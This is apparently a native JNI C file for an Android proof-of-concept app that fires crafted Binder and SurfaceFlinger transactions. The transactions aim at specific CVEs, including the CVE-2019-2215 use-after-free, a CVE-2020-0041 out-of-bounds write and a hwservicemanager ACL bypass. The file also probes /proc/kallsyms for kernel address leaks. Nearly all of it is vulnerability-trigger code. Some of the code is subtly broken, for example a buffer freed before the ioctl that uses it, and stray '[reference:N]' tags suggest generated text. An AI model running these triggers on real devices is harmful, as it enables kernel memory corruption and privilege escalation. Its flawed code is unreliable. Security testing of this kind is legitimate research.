#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <android/log.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <linux/types.h>

#include "binder.h"

#define LOG_TAG "PocJNI"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)

#define BINDER_THREAD_EXIT _IOW('b', 8, __s32)
#define BINDER_SET_MAX_THREADS _IOW('b', 5, __u32)

// CVE-2019-2215: Use-After-Free via epoll + BINDER_THREAD_EXIT[reference:18]
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeEpollTest(JNIEnv* env, jclass clazz, jint fd) {
    int epfd = epoll_create(1000);
    if (epfd < 0) {
        LOGE("epoll_create failed: %s", strerror(errno));
        return -1;
    }

    struct epoll_event ev;
    memset(&ev, 0, sizeof(ev));
    ev.events = EPOLLIN;

    if (epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev) < 0) {
        LOGE("epoll_ctl ADD failed: %s", strerror(errno));
        close(epfd);
        return -1;
    }

    // BINDER_THREAD_EXIT を呼び出し、binder_thread を解放[reference:19][reference:20]
    int ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
    LOGD("BINDER_THREAD_EXIT returned: %d", ret);

    // epoll_wait で解放済み binder_thread にアクセス（UAF トリガー）[reference:21]
    struct epoll_event events[1];
    ret = epoll_wait(epfd, events, 1, 10);

    close(epfd);

    if (ret < 0) {
        LOGE("epoll_wait failed: %s", strerror(errno));
        return -1;
    } else if (ret == 0) {
        LOGD("epoll_wait returned 0 (timeout) - no UAF triggered");
        return 0;
    } else {
        LOGD("epoll_wait returned %d - UAF MAY have been triggered!", ret);
        return -2;
    }
}

// CVE-2019-2215: BINDER_THREAD_EXIT 単体テスト
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderThreadExit(JNIEnv* env, jclass clazz, jint fd) {
    int ret = ioctl(fd, BINDER_THREAD_EXIT, NULL);
    LOGD("BINDER_THREAD_EXIT returned: %d", ret);
    return ret;
}

// CVE-2020-0041: Out-of-Bounds Write テスト[reference:22]
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderOutOfBoundsTest(JNIEnv* env, jclass clazz, jint fd) {
    // 不正なオフセットを含むトランザクションデータを構築
    // 境界チェックの誤りによる OOB 書き込みを誘発[reference:23]
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint8_t padding[256];
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 0;
    tx.tdata.flags = 0;
    tx.tdata.data_size = 0xFFFFFFFF;  // 異常なサイズ
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = 0;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    LOGD("BINDER_WRITE_READ (OOB test) returned: %d, errno=%d", ret, errno);

    if (ret < 0) {
        if (errno == EFAULT || errno == EINVAL) {
            LOGD("OOB test: patched (returned error)");
            return -1;
        }
        LOGE("OOB test: unexpected error: %s", strerror(errno));
        return -1;
    }

    LOGD("OOB test: transaction succeeded (may be vulnerable)");
    return 0;
}

// CVE-2019-2023: hwservicemanager ACL bypass テスト[reference:24]
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeHwServiceManagerAddTest(JNIEnv* env, jclass clazz, jint fd, jstring serviceName) {
    if (serviceName == NULL) return -1;

    const char* name = (*env)->GetStringUTFChars(env, serviceName, NULL);
    if (name == NULL) return -1;

    size_t len = strlen(name) + 1;
    uint8_t* data = malloc(4 + len);
    if (data == NULL) {
        (*env)->ReleaseStringUTFChars(env, serviceName, name);
        return -1;
    }

    // パーセルフォーマット: 長さ(4) + 文字列(null終端)
    data[0] = (uint8_t)(len & 0xFF);
    data[1] = (uint8_t)((len >> 8) & 0xFF);
    data[2] = (uint8_t)((len >> 16) & 0xFF);
    data[3] = (uint8_t)((len >> 24) & 0xFF);
    memcpy(data + 4, name, len);

    (*env)->ReleaseStringUTFChars(env, serviceName, name);

    // SVC_MGR_ADD_SERVICE: handle=0, code=2 (add service)
    jbyteArray jdata = (*env)->NewByteArray(env, 4 + len);
    (*env)->SetByteArrayRegion(env, jdata, 0, 4 + len, (jbyte*)data);
    free(data);

    // Java_com_example_tzpoc_MainActivity_nativeBinderTransaction を直接呼び出せないので
    // ここで直接 ioctl を実行
    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;  // SVC_MGR_ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = 4 + len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    LOGD("SVC_MGR_ADD_SERVICE (%s) returned: %d, errno=%d", (char*)(data + 4), ret, errno);

    if (ret == 0) {
        return 0;  // SUCCESS - vulnerable!
    } else if (errno == EACCES || errno == EPERM) {
        return -1;  // Permission denied - patched
    } else if (errno == EEXIST) {
        return -2;  // Service already exists
    }

    return ret;
}

// CVE-2020-0273: hwservicemanager wild pointer free テスト[reference:25]
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
    int ret = ioctl(fd, cmd, (unsigned long)arg);
    LOGD("ioctl(0x%x) returned: %d, errno=%d", cmd, ret, errno);
    return ret;
}

// SurfaceFlinger CVE-2020-0392 (double free) / CVE-2019-2194 (improper casting) テスト[reference:26][reference:27]
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeSurfaceFlingerLayerTest(JNIEnv* env, jclass clazz, jint fd) {
    // createLayer を不正なパラメータで呼び出し
    // 参考: CVE-2019-2194 - improper casting in createLayer[reference:28]
    // 参考: CVE-2020-0392 - double free in getLayerDebugInfo[reference:29]

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
        uint8_t data[64];
    } __attribute__((packed)) tx;

    memset(&tx, 0, sizeof(tx));

    // SurfaceFlinger のハンドルを取得
    // 通常は handle=0 ではないが、ここでは context manager に問い合わせる
    // まず GET_SERVICE で SurfaceFlinger のハンドルを取得
    uint8_t* getSvcData = malloc(4 + 32);
    if (getSvcData == NULL) return -1;
    const char* sf_desc = "android.ui.ISurfaceComposer";
    size_t sf_len = strlen(sf_desc) + 1;
    getSvcData[0] = (uint8_t)(sf_len & 0xFF);
    getSvcData[1] = (uint8_t)((sf_len >> 8) & 0xFF);
    getSvcData[2] = (uint8_t)((sf_len >> 16) & 0xFF);
    getSvcData[3] = (uint8_t)((sf_len >> 24) & 0xFF);
    memcpy(getSvcData + 4, sf_desc, sf_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) getSvcTx;

    memset(&getSvcTx, 0, sizeof(getSvcTx));
    getSvcTx.cmd = BC_TRANSACTION;
    getSvcTx.tdata.target.handle = 0;
    getSvcTx.tdata.code = 1;  // GET_SERVICE
    getSvcTx.tdata.data_size = 4 + sf_len;
    getSvcTx.tdata.offsets_size = 0;
    getSvcTx.tdata.data.ptr.buffer = (binder_uintptr_t)getSvcData;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(getSvcTx);
    bwr.write_buffer = (binder_uintptr_t)&getSvcTx;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    free(getSvcData);

    if (ret < 0 || bwr.read_consumed < 4) {
        LOGD("SurfaceFlinger GET_SERVICE failed");
        return -1;
    }

    int sfHandle = *(int*)read_buf;
    LOGD("SurfaceFlinger handle: %d (0x%x)", sfHandle, sfHandle);

    if (sfHandle == 0) {
        LOGD("SurfaceFlinger handle is 0, using handle=0");
        sfHandle = 0;
    }

    // createLayer を不正なパラメータで呼び出し（CVE-2019-2194）[reference:30]
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = sfHandle;
    tx.tdata.code = 6;  // createLayer[reference:31]
    tx.tdata.flags = 0;
    tx.tdata.data_size = 32;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)tx.data;

    // 不正なパラメータ: 無効な displayId, layerId, 異常なサイズ
    *(int*)(tx.data) = 0xFFFFFFFF;      // invalid displayId
    *(int*)(tx.data + 4) = 0xFFFFFFFF;  // invalid layerId
    *(int*)(tx.data + 8) = 0;           // what
    *(int*)(tx.data + 12) = 0;          // x
    *(int*)(tx.data + 16) = 0;          // y
    *(int*)(tx.data + 20) = 10000;      // w (異常な値)
    *(int*)(tx.data + 24) = 10000;      // h (異常な値)

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
    LOGD("SurfaceFlinger createLayer test returned: %d, errno=%d", ret, errno);

    if (ret == 0) {
        LOGD("createLayer succeeded (unexpected - may be vulnerable)");
        return 0;
    } else if (errno == EACCES || errno == EPERM) {
        LOGD("createLayer: permission denied (patched or restricted)");
        return -1;
    } else if (errno == EINVAL) {
        LOGD("createLayer: invalid argument (patched)");
        return -1;
    }

    return ret;
}

// Kernel Info Leak Test
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeKernelInfoLeakTest(JNIEnv* env, jclass clazz, jint fd) {
    // 複数の BINDER_VERSION 呼び出しでカーネルポインタがリークするかテスト
    struct binder_version ver;
    int leaked = 0;

    for (int i = 0; i < 10; i++) {
        memset(&ver, 0, sizeof(ver));
        int ret = ioctl(fd, BINDER_VERSION, &ver);
        if (ret == 0) {
            LOGD("BINDER_VERSION: protocol=%d", ver.protocol_version);
            // ポインタがリークしている可能性のある値をチェック
            if (ver.protocol_version > 100 || ver.protocol_version < 0) {
                leaked++;
            }
        }
    }

    // カーネルアドレスが含まれる可能性のある /proc/kallsyms をチェック
    FILE* fp = fopen("/proc/kallsyms", "r");
    if (fp != NULL) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp) != NULL && count < 10) {
            // カーネルアドレスっぽいパターンをチェック
            if (strstr(line, " f ") != NULL || strstr(line, " t ") != NULL) {
                count++;
            }
        }
        fclose(fp);
        if (count > 0) {
            LOGD("Found %d kernel symbols in /proc/kallsyms", count);
            leaked += count;
        }
    }

    // /proc/self/stack もチェック
    fp = fopen("/proc/self/stack", "r");
    if (fp != NULL) {
        char line[256];
        int count = 0;
        while (fgets(line, sizeof(line), fp) != NULL && count < 5) {
            if (strstr(line, "0x") != NULL) {
                count++;
            }
        }
        fclose(fp);
        if (count > 0) {
            LOGD("Found %d kernel addresses in /proc/self/stack", count);
            leaked += count;
        }
    }

    return leaked > 0 ? leaked : 0;
}

// 汎用トランザクション
JNIEXPORT jbyteArray JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz,
                                                             jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    uint8_t* tx_data = NULL;
    size_t tx_data_size = 0;
    if (data != NULL) {
        tx_data_size = (*env)->GetArrayLength(env, data);
        tx_data = malloc(tx_data_size);
        if (tx_data == NULL) {
            LOGE("malloc failed");
            return NULL;
        }
        (*env)->GetByteArrayRegion(env, data, 0, tx_data_size, (jbyte*)tx_data);
    }

    size_t cmd_size = sizeof(uint32_t) + sizeof(struct binder_transaction_data);
    size_t total_size = cmd_size + tx_data_size;
    uint8_t* buf = malloc(total_size);
    if (buf == NULL) {
        if (tx_data) free(tx_data);
        LOGE("malloc for buffer failed");
        return NULL;
    }

    uint32_t* cmd = (uint32_t*)buf;
    *cmd = BC_TRANSACTION;
    struct binder_transaction_data* tdata = (struct binder_transaction_data*)(buf + sizeof(uint32_t));
    memset(tdata, 0, sizeof(struct binder_transaction_data));
    tdata->target.handle = (uint32_t)handle;
    tdata->code = (uint32_t)code;
    tdata->flags = (uint32_t)flags;
    tdata->data_size = tx_data_size;
    tdata->offsets_size = 0;
    tdata->data.ptr.buffer = (binder_uintptr_t)(buf + cmd_size);
    tdata->data.ptr.offsets = 0;

    if (tx_data_size > 0 && tx_data != NULL) {
        memcpy(buf + cmd_size, tx_data, tx_data_size);
    }

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = total_size;
    bwr.write_buffer = (binder_uintptr_t)buf;

    uint8_t read_buf[4096];
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);

    if (tx_data) free(tx_data);
    free(buf);

    if (ret < 0) {
        LOGE("ioctl failed: %s (handle=%d, code=%d, data_size=%zu)",
             strerror(errno), handle, code, tx_data_size);
        return NULL;
    }
    if (bwr.read_consumed == 0) {
        return NULL;
    }

    jbyteArray result = (*env)->NewByteArray(env, bwr.read_consumed);
    (*env)->SetByteArrayRegion(env, result, 0, bwr.read_consumed, (jbyte*)read_buf);
    return result;
}

JNIEXPORT jstring JNICALL
Java_com_example_tzpoc_MainActivity_nativeBinderDumpReply(JNIEnv* env, jclass clazz,
                                                           jint fd, jint handle, jint code, jint flags, jbyteArray data) {
    jbyteArray reply = Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(
            env, clazz, fd, handle, code, flags, data);
    char result[256] = {0};
    if (reply != NULL) {
        jsize len = (*env)->GetArrayLength(env, reply);
        uint8_t* buf = malloc(len + 1);
        if (buf) {
            (*env)->GetByteArrayRegion(env, reply, 0, len, (jbyte*)buf);
            buf[len] = '\0';
            if (len <= 32) {
                char hex[128] = {0};
                int pos = 0;
                for (int i = 0; i < len && i < 32; i++) {
                    pos += snprintf(hex + pos, sizeof(hex) - pos, "%02x ", buf[i]);
                }
                snprintf(result, sizeof(result), "len=%d hex: %s", len, hex);
            } else {
                snprintf(result, sizeof(result), "len=%d", len);
            }
            free(buf);
        } else {
            snprintf(result, sizeof(result), "len=%d", len);
        }
        (*env)->DeleteLocalRef(env, reply);
    } else {
        snprintf(result, sizeof(result), "ERROR: no reply or ioctl failed");
    }
    return (*env)->NewStringUTF(env, result);
}

// /dev/binder オープン
JNIEXPORT jint JNICALL
Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
    if (path == NULL) return -1;
    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
    if (cpath == NULL) return -1;
    int fd = open(cpath, O_RDWR);
    if (fd < 0) {
        LOGE("open(%s) failed: %s", cpath, strerror(errno));
        (*env)->ReleaseStringUTFChars(env, path, cpath);
        return -errno;
    }
    (*env)->ReleaseStringUTFChars(env, path, cpath);
    return fd;
}
